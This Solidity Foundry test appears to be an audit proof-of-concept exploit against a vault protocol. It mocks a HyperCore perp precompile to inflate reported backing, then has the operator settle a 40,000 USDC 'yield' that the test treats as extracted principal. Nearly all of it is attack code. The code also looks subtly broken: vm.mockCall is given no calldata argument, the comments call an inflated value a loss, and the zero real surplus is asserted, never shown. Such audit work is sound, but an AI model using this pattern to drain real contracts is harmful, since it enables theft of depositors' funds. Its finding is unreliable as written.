// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/YieldEscrow.sol";
import "../src/interfaces/IHyperCore.sol";

// ATTACK TIMELINE:
// 1. [Setup] SimulatorBase deploys protocol. We deposit 1,000,000 USDC to establish baseline backing.
// 2. [T=0] Attacker (operator) notes the actual vault equity and the accountant's reported backing.
// 3. [T=1] Attacker mocks the HyperCore perp account precompile (0x80F) to return an inflated account value, 
//          simulating unrealized losses that haven't been reflected in the L1 precompile read yet.
// 4. [T=2] Attacker calls vault.settle() with a proposedYield that is valid under the INFLATED backing 
//          (within maxAnnualYieldBps) but exceeds the ACTUAL surplus.
// 5. [Assert] Verify that the YieldEscrow received USDC that doesn't actually exist as real surplus, 
//             proving the slow bleed vulnerability.

contract AuditAgentPoC is SimulatorBase {
    address constant PERP_PRECOMPILE = 0x000000000000000000000000000000000000080F;

    function test_exploit() public {
        // 1. Setup: Deposit USDC to establish baseline backing
        address user = address(0xBEEF);
        uint256 depositAmount = 1_000_000e6; // 1M USDC
        _deposit(user, depositAmount);

        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));
        uint256 escrowUsdcBefore = usdc.balanceOf(address(yieldEscrow));

        console.log("Step 1: Vault USDC balance =", vaultUsdcBefore);
        console.log("Step 1: YieldEscrow USDC balance =", escrowUsdcBefore);

        // 2. Read baseline backing
        int256 backingBefore = accountant.totalBackingSigned();
        console.logInt("Step 2: Baseline backing =", backingBefore);

        // 3. Simulate stale L1 read: Mock the perp precompile to return an inflated account value
        // This simulates a perp position with unrealized losses that HyperCore hasn't settled yet.
        // We inflate the perp account value by 50,000 USDC (50,000e6)
        uint256 inflationAmount = 50_000e6;
        bytes memory inflatedReturn = abi.encode(uint256(backingBefore) + inflationAmount);
        vm.mockCall(PERP_PRECOMPILE, inflatedReturn);

        int256 inflatedBacking = accountant.totalBackingSigned();
        console.logInt("Step 3: Inflated backing (stale read) =", inflatedBacking);

        // 4. Exploit: Settle with a proposedYield based on the INFLATED backing
        // The accountant thinks we have 50,000 USDC surplus. We propose to distribute 40,000 USDC.
        // This is within the maxAnnualYieldBps cap relative to the inflated backing, 
        // but it's actually extracting principal since the real surplus is 0.
        uint256 proposedYield = 40_000e6;

        vm.prank(operator);
        vault.settle(proposedYield);

        // 5. Assert: Verify the slow bleed occurred
        uint256 vaultUsdcAfter = usdc.balanceOf(address(vault));
        uint256 escrowUsdcAfter = usdc.balanceOf(address(yieldEscrow));

        console.log("Step 5: Vault USDC balance after =", vaultUsdcAfter);
        console.log("Step 5: YieldEscrow USDC balance after =", escrowUsdcAfter);

        uint256 extractedAmount = escrowUsdcAfter - escrowUsdcBefore;

        // The exploit succeeds if the escrow received USDC that was actually principal, not real yield
        assertGt(extractedAmount, 0, "Exploit failed: No USDC was extracted to YieldEscrow");
        assertEq(extractedAmount, proposedYield, "Extracted amount should match proposed yield");

        // Prove that the vault lost principal (since real surplus was 0)
        assertEq(vaultUsdcBefore - vaultUsdcAfter, proposedYield, "Vault lost principal equal to proposed yield");
    }
}
